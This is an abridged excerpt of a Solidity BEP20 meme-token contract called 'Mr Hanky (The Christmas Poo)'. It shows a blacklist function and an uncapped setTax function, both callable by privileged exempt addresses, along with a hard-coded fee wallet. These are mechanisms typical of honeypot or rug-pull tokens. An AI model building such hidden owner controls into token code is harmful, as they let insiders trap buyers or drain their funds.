...
contract MrHankyTheChristmasPoo is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Mr Hanky(The Christmas Poo)";
    string constant _symbol = "Hank";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x24D32932d71d46D45F88AafB481355bef4D37a61;
    ...
    function addblacklist(address[] calldata addresses, bool status) public {
        require(isTxLimitExempt[msg.sender]);
    ...
    function addLaunch(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
    ...
    function setTax(uint256 _liquidityFee, uint256 _rewardFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public {
        require(isTxLimitExempt[msg.sender]);
